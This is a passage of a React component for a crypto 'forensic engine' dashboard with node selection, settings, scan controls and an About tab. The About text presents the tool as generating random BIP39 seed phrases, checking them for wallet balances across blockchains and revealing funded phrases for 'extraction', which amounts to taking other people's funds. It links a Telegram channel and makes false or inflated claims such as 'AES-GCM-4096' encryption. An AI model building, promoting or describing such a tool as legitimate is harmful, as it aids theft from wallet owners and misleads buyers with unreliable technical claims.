                        const isElite = server.status === 'ELITE-CORE';
                        const isStandard = server.status === 'STANDARD';
                        const isPrime = server.id === 'node-prime-exclusive';
                        const isLocked = isPrime && !licenseData?.aiSearchEnabled;
                        
                        return (
                          <div 
                            key={server.id} 
                            onClick={() => {
                              if (isLocked) {
                                toast({
                                  variant: "destructive",
                                  title: "Access Denied",
                                  description: "Neural Core Prime requires Enterprise Tier license."
                                });
                                return;
                              }
                              if (!isInterrogating && isOnline) {
                                setSelectedServerId(server.id);
                                toast({
                                  title: "Node Migration",
                                  description: `System linked to ${server.name}.`
                                });
                              }
                            }}
                            className={cn(
                              "relative p-6 rounded-3xl border transition-all duration-700 overflow-hidden", 
                              isSelected ? "bg-primary/[0.15] border-primary/80 scale-[1.02] shadow-[0_0_50px_rgba(173,79,230,0.3)] z-10" : "bg-white/[0.02] border-white/5 hover:border-primary/50 hover:scale-[1.02]",
                              (isInterrogating || !isOnline || isLocked) ? "cursor-not-allowed" : "cursor-pointer",
                              isLocked && "opacity-40 grayscale"
                            )}
                          >
                            <div className="flex flex-col gap-6 relative z-10">
                              <div className="flex items-start justify-between gap-4">
                                <div className="flex items-center gap-4">
                                  <div className={cn("w-14 h-14 rounded-2xl flex items-center justify-center transition-all duration-700 shrink-0", isSelected ? "bg-primary text-black shadow-glow scale-110" : "bg-white/5 text-gray-500")}>
                                    {isLocked ? <Lock className="w-7 h-7" /> : <ServerIcon className="w-7 h-7" />}
                                  </div>
                                  <div className="min-w-0">
                                    <p className="text-[0.6875rem] font-black uppercase tracking-[0.05em] text-white truncate">{server.name}</p>
                                    <p className="text-[0.5625rem] text-primary/70 uppercase font-black tracking-widest mt-1.5 truncate">{server.region}</p>
                                  </div>
                                </div>
                                <div className="flex flex-col items-end shrink-0">
                                  <div className={cn(
                                    "text-[0.5rem] font-black px-2.5 py-1 rounded-md uppercase tracking-widest border transition-all duration-500", 
                                    isElite ? "bg-green-500/20 text-green-400 border-green-500/30 animate-pulse" : 
                                    isStandard ? "bg-blue-500/20 text-blue-400 border-blue-500/30" :
                                    "bg-white/10 text-white/40 border-white/5"
                                  )}>
                                    {isLocked ? "LOCKED" : server.status}
                                  </div>
                                  <span className="text-[0.5rem] text-gray-600 mt-2 font-code tabular-nums uppercase tracking-tight">IP: {isLocked ? "REDACTED" : server.ip}</span>
                                </div>
                              </div>

                              {isPrime && isSelected && !isLocked && (
                                <div className="space-y-4 pt-5 border-t border-white/10 animate-in fade-in duration-700">
                                  <p className="text-[0.5rem] font-black text-gray-500 uppercase tracking-widest">Node Features</p>
                                  <div className="grid grid-cols-1 gap-3">
                                    {server.features?.map((feature, idx) => (
                                      <div key={idx} className="flex items-start gap-3 text-[0.5625rem] font-bold text-white/80 leading-tight animate-in slide-in-from-left-2 duration-300" style={{ animationDelay: `${idx * 100}ms` }}>
                                        <CheckCircle2 className="w-3.5 h-3.5 text-primary mt-0.5 shrink-0" />
                                        <span className="tracking-tight uppercase">{feature}</span>
                                      </div>
                                    ))}
                                  </div>
                                </div>
                              )}

                              <div className="grid grid-cols-2 gap-6 pt-5 border-t border-white/10">
                                <div className="space-y-2">
                                  <div className="flex items-center justify-between text-[0.5rem] font-code uppercase tracking-tight">
                                    <span className="text-gray-600">Peak Velocity</span>
                                    <span className="text-green-500 font-black tabular-nums">{isOnline && !isLocked ? server.latency : "N/A"}</span>
                                  </div>
                                  <div className="h-1.5 w-full bg-white/5 rounded-full overflow-hidden">
                                    <div className="h-full bg-green-500/60 transition-all duration-[2500ms]" style={{ width: isSelected && !isLocked ? '98%' : '70%' }} />
                                  </div>
                                </div>
                                <div className="space-y-2">
                                  <div className="flex items-center justify-between text-[0.5rem] font-code uppercase tracking-tight">
                                    <span className="text-gray-600">Mesh Health</span>
                                    <span className="text-primary font-black uppercase tracking-widest">{isLocked ? "OFFLINE" : "OPTIMAL"}</span>
                                  </div>
                                  <div className="h-1.5 w-full bg-white/5 rounded-full overflow-hidden">
                                    <div className="h-full bg-primary/60 transition-all duration-[2500ms]" style={{ width: isSelected && !isLocked ? '100%' : '85%' }} />
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        )
                      })}
                    </div>
                  </div>
                  
                  <div className="lg:col-span-8 flex flex-col gap-8 min-h-0 pr-2 pb-12 lg:pb-0">
                    <div className="glass-panel rounded-[40px] p-8 md:p-14 border-white/5 flex flex-col flex-1 relative overflow-hidden shadow-[0_50px_100px_rgba(0,0,0,0.7)] hover:border-primary/10 transition-all duration-1000">
                       <div className="absolute inset-0 bg-gradient-to-tr from-primary/15 via-transparent to-transparent pointer-events-none" />
                       <div className="relative z-10 flex flex-col h-full">
                         <div className="flex items-center justify-between mb-8 shrink-0">
                            <div className="flex items-center gap-6">
                              <div className={cn(
                                "w-16 h-16 rounded-[24px] flex items-center justify-center text-primary relative border shrink-0 transition-all duration-700",
                                isEliteSelected ? "bg-primary/20 border-primary/50 shadow-glow scale-115" : "bg-primary/10 border-primary/30"
                              )}>
                                <Dna className={cn("w-8 h-8 transition-all duration-1000", (isInterrogating && isOnline) && "animate-pulse")} />
                                {(isInterrogating && isOnline) && <div className="absolute inset-0 rounded-[24px] pulse-ring border border-primary/50" />}
                              </div>
                              <div className="min-w-0">
                                <h4 className="text-[1.125rem] md:text-[1.25rem] font-black uppercase tracking-[0.1em] text-white truncate">{selectedServer?.name}</h4>
                                <p className="text-[0.5625rem] md:text-[0.625rem] text-primary/60 font-code uppercase tracking-widest mt-2 truncate">{selectedServer?.region} • Neural Interrogation Mesh</p>
                              </div>
                            </div>
                         </div>
                         
                         <div className="flex-1 flex items-center justify-center relative my-4 overflow-hidden">
                            <div className="relative flex items-center justify-center w-full max-w-md aspect-square">
                               <div className={cn(
                                 "absolute inset-0 rounded-full bg-primary/5 blur-[100px] transition-all duration-1000",
                                 isEliteSelected ? "opacity-100 scale-150" : "opacity-60 scale-100"
                               )} />
                               
                               <div className={cn(
                                 "absolute inset-0 border border-primary/20 rounded-full transition-all animate-[spin_40s_linear_infinite]",
                                 isEliteSelected && "animate-[spin_12s_linear_infinite]"
                               )} 
                                    style={{ borderStyle: 'dashed', borderDasharray: '50 30' }} />

                               <div className={cn(
                                 "relative z-10 w-28 md:w-36 h-28 md:h-36 flex items-center justify-center rounded-[32px] rotate-45 border transition-all duration-1000",
                                 isEliteSelected 
                                   ? "bg-primary/30 border-primary/70 shadow-[0_0_150px_rgba(173,79,230,1)] scale-125" 
                                   : "bg-primary/5 border-primary/25 shadow-[0_0_60px_rgba(173,79,230,0.4)] scale-100"
                               )}>
                                 <div className={cn(
                                   "w-14 md:w-20 h-14 md:h-20 rounded-[24px] bg-primary shadow-glow transition-all duration-700",
                                   isEliteSelected ? "animate-pulse" : ""
                                 )} />
                               </div>

                               {(isInterrogating && isOnline) && (
                                 <div className="absolute inset-0 rounded-full border border-primary/60 animate-ping opacity-40 duration-[2500ms]" />
                               )}

                               {!isOnline && (
                                 <div className="absolute inset-0 flex items-center justify-center z-20">
                                   <div className="glass-panel p-8 rounded-[32px] border-red-500/40 flex flex-col items-center gap-4 shadow-[0_0_40px_rgba(239,68,68,0.2)] animate-in zoom-in-95 duration-500">
                                      <WifiOff className="w-12 md:w-16 h-12 md:h-16 text-red-500 animate-pulse" />
                                      <span className="text-[0.625rem] md:text-[0.6875rem] font-black text-red-500 uppercase tracking-[0.3em]">Link Severed</span>
                                   </div>
                                 </div>
                               )}
                            </div>
                         </div>

                         <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 md:gap-10 mt-6 shrink-0">
                            {[
                              { icon: Signal, label: 'Velocity', value: isOnline ? (parseFloat(selectedServer?.latency || "50") < 10 ? "ULTRA-ELITE" : "NOMINAL") : "OFFLINE" },
                              { icon: ShieldCheck, label: 'Encryption', value: isOnline ? "AES-GCM-4096" : "SUSPENDED" },
                              { icon: Microchip, label: 'Core Integrity', value: isOnline ? "SYNCHRONIZED" : "STALLED" }
                            ].map((info, idx) => (
                              <div key={idx} className="p-6 md:p-8 glass-panel rounded-3xl border-white/5 space-y-4 md:space-y-5 transition-all duration-500 hover:border-primary/50 hover:bg-white/[0.04] shadow-lg">
                                 <span className="text-[0.5625rem] md:text-[0.625rem] text-gray-600 uppercase font-black tracking-widest flex items-center gap-3">
                                   <info.icon className="w-4 md:w-5 h-4 md:h-5 transition-colors duration-500" /> {info.label}
                                 </span>
                                 <p className="text-[1.125rem] md:text-[1.25rem] font-black text-white font-code tracking-tighter uppercase truncate transition-all duration-500">{info.value}</p>
                              </div>
                            ))}
                         </div>
                       </div>
                    </div>

                    <div className="glass-panel rounded-[32px] border-white/5 flex flex-col h-[280px] md:h-[350px] relative overflow-hidden shadow-[0_40px_80px_rgba(0,0,0,0.6)] shrink-0 hover:border-primary/10 transition-all duration-1000">
                      <div className="flex items-center justify-between p-5 md:p-8 border-b border-white/10 bg-white/[0.03] shrink-0">
                        <div className="flex items-center gap-4">
                           <Terminal className="w-5 h-5 text-primary" />
                           <h3 className="text-[0.625rem] md:text-[0.75rem] font-black uppercase tracking-[0.2em] text-white">Node Activity Feed</h3>
                        </div>
                        <div className="flex items-center gap-3">
                           <div className="w-2 h-2 rounded-full bg-primary animate-pulse shadow-[0_0_10px_rgba(173,79,230,0.8)]" />
                           <span className="text-[0.5rem] md:text-[0.625rem] font-bold text-primary/70 uppercase tracking-widest">Live Node Sync</span>
                        </div>
                      </div>
                      <div className="flex-1 bg-black/70 p-5 md:p-8 font-code text-[0.625rem] md:text-[0.6875rem] overflow-hidden relative">
                        <div className="absolute inset-0 scanline opacity-40 z-20 pointer-events-none" />
                        <div ref={serverLogRef} className="h-full overflow-y-auto no-scrollbar space-y-2.5 flex flex-col z-10 relative scroll-smooth">
                           {serverLogs.map((log, i) => (
                             <div key={i} className="text-[#00FF41]/70 py-1.5 border-b border-white/[0.04] tracking-tighter animate-in slide-in-from-left-2 duration-300">
                               <span className="text-gray-600 mr-3 opacity-60 select-none font-bold uppercase whitespace-nowrap">Node_Log:</span> {log}
                             </div>
                           ))}
                           {!isOnline && (
                             <div className="text-red-500 font-bold py-4 animate-pulse uppercase tracking-widest border border-red-500/20 bg-red-500/5 px-6 rounded-xl text-center text-[0.5625rem] animate-in zoom-in-95 duration-500">
                               [CRITICAL] System Loss: Node Uplink Disconnected
                             </div>
                           )}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'settings' && (
                <div className="max-w-4xl mx-auto w-full flex flex-col gap-10 pb-24 overflow-y-auto no-scrollbar pr-3 scroll-smooth animate-in slide-in-from-bottom-4 duration-700">
                  <div className="glass-panel rounded-[32px] p-12 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)] hover:border-primary/10 transition-all duration-1000">
                    <h3 className="text-[1.5rem] font-black uppercase tracking-[0.2em] mb-12 border-b border-white/10 pb-6">Performance Management</h3>
                    <div className="space-y-16">
                      {[
                        { icon: Gauge, label: 'Scan Throughput (Hz)', value: `${systemIntensity[0]}% Velocity`, state: systemIntensity, setState: setSystemIntensity, max: 100, step: 1, desc: 'Modulates the interrogation frequency and engine neural load.' },
                        { icon: Layers, label: 'Neural Core Allocation', value: `${allocatedCores[0]} / 8 Cores`, state: allocatedCores, setState: setAllocatedCores, min: 1, max: 8, step: 1, desc: 'Allocates processing threads for forensic seed generation.' }
                      ].map((item, idx) => (
                        <div key={idx} className="space-y-6 animate-in slide-in-from-left-4 duration-500" style={{ animationDelay: `${idx * 150}ms` }}>
                          <div className="flex items-center justify-between">
                            <div className="flex items-center gap-3">
                              <item.icon className="w-5 h-5 text-primary" />
                              <label className="text-[0.875rem] font-bold text-white uppercase tracking-widest">{item.label}</label>
                            </div>
                            <span className="text-[0.875rem] font-code text-primary tracking-tight">{item.value}</span>
                          </div>
                          <Slider value={item.state} onValueChange={item.setState} min={item.min || 0} max={item.max} step={item.step} disabled={isInterrogating} className="cursor-pointer" />
                          <p className="text-[0.625rem] text-gray-500 uppercase tracking-widest leading-relaxed font-medium">{item.desc}</p>
                        </div>
                      ))}

                      <div className="space-y-8 pt-12 border-t border-white/10 animate-in fade-in duration-1000">
                        <div className="flex items-center gap-3 mb-6">
                          <LayoutDashboard className="w-5 h-5 text-primary" />
                          <h4 className="text-[0.6875rem] font-black text-white/60 uppercase tracking-widest">Global UI Scaling</h4>
                        </div>
                        <div className="space-y-6">
                          <div className="flex items-center justify-between">
                            <label className="text-[0.6875rem] font-bold text-gray-400 uppercase tracking-widest">UI Scale Factor</label>
                            <span className="text-[0.875rem] font-code text-primary font-bold">{uiScale}%</span>
                          </div>
                          <Slider value={[uiScale]} onValueChange={(val) => setUiScale(val[0])} min={50} max={150} step={1} className="cursor-pointer" />
                          <div className="flex gap-4">
                            {[75, 100, 125].map(scale => (
                              <Button 
                                key={scale} 
                                variant="outline" 
                                size="sm" 
                                onClick={() => setUiScale(scale)} 
                                className={cn("text-[0.5625rem] uppercase font-black h-8 px-4 transition-all duration-300", uiScale === scale ? "border-primary text-primary bg-primary/10" : "border-white/10 text-gray-500 hover:text-white")}
                              >
                                {scale}%
                              </Button>
                            ))}
                          </div>
                          <p className="text-[0.625rem] text-gray-600 uppercase tracking-widest leading-relaxed font-medium">Adjusts the global resolution of the workstation interface proportionally.</p>
                        </div>
                      </div>

                      <div className="space-y-8 pt-12 border-t border-white/10 animate-in fade-in duration-1000">
                        <h4 className="text-[0.6875rem] font-black text-gray-500 uppercase tracking-widest">System Optimization</h4>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                           <div className="flex flex-col gap-4 p-8 rounded-[24px] border border-white/5 bg-white/[0.01] hover:bg-white/[0.04] transition-all duration-500 group shadow-lg">
                              <div className="flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                  <Trash2 className="w-5 h-5 text-primary" />
                                  <p className="text-[0.75rem] font-bold text-white uppercase tracking-wider">Neural Memory Flush</p>
                                </div>
                                <Button variant="outline" size="sm" onClick={handleMemoryFlush} className="h-9 px-4 text-[0.625rem] uppercase font-black border-primary/30 text-primary hover:bg-primary/20 rounded-lg transition-all active:scale-95">Flush Memory</Button>
                              </div>
                              <p className="text-[0.625rem] text-gray-600 uppercase leading-relaxed font-medium">Clears terminal and server activity logs to optimize client-side memory. Auto-flush enabled.</p>
                           </div>
                           <div className="flex flex-col gap-4 p-8 rounded-[24px] border border-red-500/15 bg-red-500/[0.01] hover:bg-red-500/[0.05] transition-all duration-500 group shadow-lg">
                              <div className="flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                  <RotateCcw className="w-5 h-5 text-red-500" />
                                  <p className="text-[0.75rem] font-bold text-white uppercase tracking-wider">Reset Workstation</p>
                                </div>
                                <Button variant="outline" size="sm" onClick={clearSession} className="h-9 px-4 text-[0.625rem] uppercase font-black border-red-500/30 text-red-500 hover:bg-red-500/20 rounded-lg transition-all active:scale-95">Hard Reset</Button>
                              </div>
                              <p className="text-[0.625rem] text-gray-600 uppercase leading-relaxed font-medium">Purges all session stats and engine configurations. This action is irreversible.</p>
                           </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="glass-panel rounded-[32px] p-12 border-white/5 shadow-[0_30px_70px_rgba(0,0,0,0.6)] hover:border-primary/10 transition-all duration-1000">
                    <h3 className="text-[1.5rem] font-black uppercase tracking-[0.2em] mb-12 border-b border-white/10 pb-6">Console Customization</h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                      <div className="space-y-8">
                        <div className="flex items-center gap-3 mb-2">
                           <Palette className="w-5 h-5 text-primary" />
                           <h4 className="text-[0.6875rem] font-black text-white/60 uppercase tracking-widest">Seed Phrase Color</h4>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          {SEED_COLORS.map((color, idx) => (
                            <button key={color.name} onClick={() => setSeedPhraseColor(color.class)} className={cn("flex items-center justify-between p-4 rounded-xl border text-left transition-all duration-500 shadow-md hover:scale-[1.06] animate-in slide-in-from-bottom-2", seedPhraseColor === color.class ? "bg-primary/15 border-primary/50 shadow-primary/10" : "bg-white/[0.02] border-white/5 hover:border-white/30")} style={{ animationDelay: `${idx * 50}ms` }}>
                              <span className="text-[0.625rem] font-bold text-gray-400 uppercase leading-none">{color.name}</span>
                              <div className={cn("w-4 h-4 rounded-full border border-white/10", color.class.includes('gradient') ? 'bg-gradient-to-tr from-red-500 via-green-500 to-blue-500' : color.class.split(' ')[0])} />
                            </button>
                          ))}
                        </div>
                      </div>
                      <div className="space-y-10">
                        <div className="flex items-center gap-3 mb-2">
                           <Type className="w-5 h-5 text-primary" />
                           <h4 className="text-[0.6875rem] font-black text-white/60 uppercase tracking-widest">Console Typography</h4>
                        </div>
                        <div className="space-y-8">
                          <div className="flex items-center justify-between">
                            <label className="text-[0.6875rem] font-bold text-gray-400 uppercase tracking-widest">Font Size</label>
                            <span className="text-[0.875rem] font-code text-primary font-bold">{consoleFontSize[0]}px</span>
                          </div>
                          <Slider value={consoleFontSize} onValueChange={setConsoleFontSize} min={8} max={24} step={1} className="cursor-pointer" />
                          <p className="text-[0.625rem] text-gray-600 uppercase tracking-widest italic">Live preview applies to terminal interrogator.</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'about' && (
                <div className="max-w-[1000px] mx-auto w-full flex flex-col gap-12 pb-24 overflow-y-auto no-scrollbar pr-3 scroll-smooth animate-in slide-in-from-bottom-4 duration-700">
                  <section className="relative overflow-hidden glass-panel rounded-[40px] p-12 border-primary/20 bg-primary/[0.02] shadow-[0_40px_80px_rgba(0,0,0,0.7)] group transition-all duration-1000">
                    <div className="absolute top-0 right-0 p-10 opacity-5 group-hover:opacity-15 transition-all duration-1000">
                      <BrainCircuit className="w-56 h-56 text-primary" />
                    </div>
                    <div className="relative z-10 space-y-10">
                      <div className="flex items-center gap-6">
                        <div className="w-16 h-16 rounded-[24px] bg-primary flex items-center justify-center shadow-glow animate-pulse duration-[3000ms]">
                          <Zap className="w-9 h-9 text-black" />
                        </div>
                        <div>
                          <h2 className="text-[1.875rem] font-black uppercase tracking-[0.1em] text-white">Core Forensic Engine</h2>
                          <p className="text-[0.6875rem] font-bold text-primary uppercase tracking-[0.4em] mt-1">Operational Protocol v4.0 Elite</p>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-10 py-6 border-t border-white/10">
                        <div className="space-y-5 animate-in slide-in-from-left-4 duration-500">
                          <h3 className="text-[0.875rem] font-black uppercase tracking-widest text-white/80 flex items-center gap-3">
                            <Layers className="w-5 h-5 text-primary" /> High-Entropy Synthesis
                          </h3>
                          <p className="text-[0.9375rem] text-gray-400 leading-relaxed hover:text-white/90 transition-all duration-300">
                            The engine autonomously synthesizes high-entropy <span className="text-white font-black">BIP39 recovery phrases</span> (12, 18, and 24 words) and immediately performs deep-spectrum node interrogation to identify active blockchain signatures.
                          </p>
                        </div>
                        <div className="space-y-5 animate-in slide-in-from-right-4 duration-500">
                          <h3 className="text-[0.875rem] font-black uppercase tracking-widest text-white/80 flex items-center gap-3">
                            <ShieldCheck className="w-5 h-5 text-primary" /> Automated Discovery
                          </h3>
                          <p className="text-[0.9375rem] text-gray-400 leading-relaxed hover:text-white/90 transition-all duration-300">
                            Every generated phrase is checked for <span className="text-white font-black">non-zero ledger balances</span>. Upon detection, the system unmasks the <span className="text-green-400 font-black">mnemonic phrase</span> for immediate operator extraction.
                          </p>
                        </div>
                      </div>
                    </div>
                  </section>

                  <section className="grid grid-cols-1 lg:grid-cols-3 gap-10">
                    <div className="lg:col-span-1 glass-panel rounded-[40px] p-10 border-white/5 flex flex-col items-center text-center space-y-6 shadow-2xl hover:border-primary/40 group hover:scale-[1.03] transition-all duration-700">
                      <div className="relative">
                        <div className="w-28 h-28 rounded-full bg-gradient-to-tr from-primary to-accent p-1.5 shadow-glow animate-pulse duration-[4000ms]">
                          <div className="w-full h-full rounded-full bg-[#0a0a0f] flex items-center justify-center overflow-hidden">
                             <Fingerprint className="w-14 h-14 text-primary group-hover:scale-110 transition-transform duration-700" />
                          </div>
                        </div>
                        <div className="absolute -bottom-2 right-0 bg-primary text-black text-[0.5625rem] font-black px-3 py-1 rounded-full border border-black shadow-lg">VERIFIED</div>
                      </div>
                      <div>
                        <h3 className="text-[1.25rem] font-black text-white uppercase tracking-tighter">Alex Mercer</h3>
                        <p className="text-[0.625rem] font-bold text-primary uppercase tracking-[0.2em] mb-6">Founder & Neural Architect</p>
                        <p className="text-[0.8125rem] text-gray-500 leading-relaxed italic hover:text-gray-300 transition-all duration-300">
                          "The complexity of the neural mesh is only limited by the entropy of our ambition. We don't just find assets; we restore forensic sovereignty."
                        </p>
                      </div>
                    </div>

                    <div className="lg:col-span-2 glass-panel rounded-[40px] p-10 border-white/5 space-y-8 shadow-2xl relative overflow-hidden group hover:border-primary/30 transition-all duration-700">
                      <div className="absolute top-0 right-0 p-6 opacity-5 transition-all duration-1000 group-hover:opacity-10">
                        <Shield className="w-40 h-40 text-primary rotate-12 group-hover:rotate-0 transition-transform duration-1000" />
                      </div>
                      <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.4em] text-white/60 mb-8">System Operational Protocol</h3>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-8">
                        {[
                          { icon: Cpu, step: "Neural Synthesis", desc: "Autonomous generation of 12/18/24-word seed phrases using high-entropy models." },
                          { icon: Network, step: "Global Node Sync", desc: "Real-time interrogation of BTC, ETH, SOL, and Multi-Chain nodes for active signatures." },
                          { icon: Gauge, step: "Asset Audit", desc: "Deep-spectrum verification of wallet balances and token valuations across the mesh." },
                          { icon: WalletIcon, step: "Extraction", desc: "Automatic unmasking of mnemonics to the operator only when a balance is confirmed." }
                        ].map((item, i) => (
                          <div key={i} className="flex gap-5 group/item transition-all duration-300 animate-in fade-in slide-in-from-bottom-2" style={{ animationDelay: `${i * 100}ms` }}>
                            <div className="w-12 h-12 rounded-2xl bg-white/5 flex items-center justify-center shrink-0 border border-white/5 group-hover/item:border-primary/50 group-hover/item:bg-primary/10 transition-all duration-500 group-hover/item:scale-110">
                              <item.icon className="w-6 h-6 text-gray-500 group-hover/item:text-primary transition-all duration-500" />
                            </div>
                            <div className="space-y-1.5">
                              <span className="text-[0.6875rem] font-black text-white uppercase tracking-widest group-hover/item:text-primary transition-all duration-300">{item.step}</span>
                              <p className="text-[0.6875rem] text-gray-500 leading-normal uppercase font-bold tracking-tight group-hover/item:text-gray-300 transition-all duration-300">{item.desc}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  </section>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                    <section className="glass-panel rounded-[32px] p-8 border-white/5 space-y-6 shadow-xl hover:border-primary/30 transition-all duration-700 animate-in slide-in-from-left-4 duration-700">
                      <h4 className="text-[0.6875rem] font-black uppercase tracking-[0.3em] text-white/40 border-b border-white/10 pb-3">Technical Manifest</h4>
                      <div className="space-y-4 font-code">
                        {[
                          { label: "Core Version", val: "v4.0 Elite" },
                          { label: "Neural Engine", val: "Hyper-Prime Gen 4" },
                          { label: "Throughput", val: "Unlimited forensic Hz" },
                          { label: "License Status", val: "Enterprise Tier" }
                        ].map((info, i) => (
                          <div key={i} className="flex items-center justify-between text-[0.6875rem] animate-in fade-in" style={{ animationDelay: `${i * 100}ms` }}>
                            <span className="text-gray-600 uppercase font-black">{info.label}:</span>
                            <span className="text-white font-bold uppercase tracking-widest">{info.val}</span>
                          </div>
                        ))}
                      </div>
                    </section>
                    
                    <section className="glass-panel rounded-[32px] p-8 border-white/5 flex flex-col justify-between shadow-xl group hover:border-primary/30 transition-all duration-700 animate-in slide-in-from-right-4 duration-700">
                      <div className="space-y-3">
                        <h4 className="text-[0.6875rem] font-black uppercase tracking-[0.3em] text-white/40 flex items-center gap-3">
                          <Share2 className="w-4 h-4" /> Communications
                        </h4>
                        <p className="text-[0.6875rem] text-gray-500 uppercase font-bold tracking-widest leading-relaxed">
                          Join the high-latency operator network for real-time node updates and technical support.
                        </p>
                      </div>
                      <a href="https://t.me/Ai_Crypto_Software" target="_blank" rel="noopener noreferrer" className="mt-6 flex items-center justify-center gap-3 w-full py-5 rounded-2xl bg-gradient-to-r from-primary to-accent text-white font-black text-[11px] uppercase tracking-[0.3em] hover:shadow-glow transition-all hover:scale-[1.03] shadow-lg">
                        <ExternalLink className="w-4 h-4" /> TELEGRAM UPLINK
                      </a>
                    </section>
                  </div>
                </div>
              )}

              {activeTab === 'dashboard' && (
                <div className="flex gap-6 items-center justify-center pt-10 border-t border-white/5 pb-6 shrink-0 mt-auto animate-in fade-in slide-in-from-top-4 duration-700">
                  {isInterrogating ? (
                    <Button onClick={stopInterrogation} variant="outline" className="bg-red-500/10 border-red-500/40 hover:bg-red-500/20 text-red-500 h-16 px-16 rounded-2xl font-black text-[0.875rem] uppercase tracking-[0.3em] transition-all duration-500 shadow-[0_0_25px_rgba(239,68,68,0.2)] hover:scale-105 active:scale-95">
                      <Power className="w-5 h-5 mr-3" /> STOP SCAN
                    </Button>
                  ) : (
                    <Button onClick={startInterrogation} disabled={activeBlockchains.length === 0 || isBooting || !isOnline} className={cn("h-16 px-24 rounded-2xl font-black text-[0.875rem] uppercase tracking-[0.3em] transition-all duration-500 bg-gradient-to-r from-[#AD4FE6] to-[#2937A3] text-white shadow-[0_0_40px_rgba(173,79,230,0.5)] hover:opacity-95 hover:scale-[1.05] active:scale-95 disabled:opacity-30")}>
                      <Zap className="w-5 h-5 mr-3" /> START SCAN
                    </Button>
                  )}
                  {activeBlockchains.length === 0 && !isInterrogating && !isBooting && isOnline && (
                    <div className="flex items-center gap-3 text-[0.6875rem] text-yellow-500 font-bold uppercase animate-pulse">
                      <AlertTriangle className="w-4 h-4" /> Select Blockchains to Proceed
                    </div>
                  )}
                  {isBooting && isOnline && (
                    <div className="flex items-center gap-3 text-[0.6875rem] text-primary font-bold uppercase animate-pulse">
                      <RefreshCw className="w-4 h-4 animate-spin duration-[3000ms]" /> System Initializing...
                    </div>
                  )}
                  {!isOnline && (
                    <div className="flex items-center gap-3 text-[0.6875rem] text-red-500 font-bold uppercase animate-pulse">
                      <WifiOff className="w-4 h-4" /> Offline: Awaiting Reconnection
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>

          <footer className="h-10 border-t border-white/5 bg-black/60 backdrop-blur-md flex items-center justify-between px-8 shrink-0">
            <div className="ticker-wrap flex-1 mr-8 overflow-hidden whitespace-nowrap">
              <p className="ticker-content text-[0.5rem] text-primary/60 uppercase tracking-[0.4em] font-code">
                Status: {!isOnline ? "CONNECTION SEVERED" : isInterrogating ? (isBoosterActive ? "BOOSTER ACTIVE" : "SCANNING") : isBooting ? "INITIALIZING" : "STANDBY"} • Active Node: {selectedServer?.name} • Logic: Hyper-Prime Neural Core • Encryption: AES-GCM-4096 Verified
              </p>
            </div>
          </footer>
        </main>
      </div>
    </SidebarProvider>
  )
}
